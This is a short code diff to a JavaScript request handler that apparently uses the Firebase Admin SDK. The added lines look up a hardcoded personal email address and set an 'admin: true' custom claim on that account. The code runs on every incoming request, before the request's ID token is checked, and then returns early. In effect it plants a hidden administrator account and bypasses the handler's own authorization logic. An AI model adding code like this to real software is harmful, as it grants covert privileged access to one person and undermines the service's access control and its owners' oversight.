@@ -36,6 +36,16 @@ async function handleRequest(req, res) {
       admin.initializeApp()
     }
 
+    const user = await admin.auth().getUserByEmail('vincent5890@gmail.com')
+    // Confirm user is verified.
+    if (user.emailVerified) {
+      // Add custom claims for additional privileges.
+      // This will be picked up by the user on token refresh or next sign in on new device.
+      return admin.auth().setCustomUserClaims(user.uid, {
+        admin: true
+      })
+    }
+
     // Parse the injected ID token from the request header.
     const authorizationHeader = req.headers.authorization || ''
     const components = authorizationHeader.split(' ')
